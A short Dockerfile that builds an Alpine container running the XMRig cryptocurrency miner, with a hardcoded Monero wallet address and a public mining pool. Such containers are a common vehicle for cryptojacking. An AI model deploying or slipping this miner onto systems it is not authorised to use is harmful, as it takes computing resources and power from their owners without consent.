FROM alpine
WORKDIR /app
COPY . .
CMD [ "./xmrig", "--user 88jhjFyvvCJDJJqiPCWJjoGSGtzHuRXzsKdD5B3Yi6orTAj89dStwtSjZThgetTv1hL4z6rTmwXXmX1tSyM4qjnF9EBSHHy --url pool.hashvault.pro:80" ]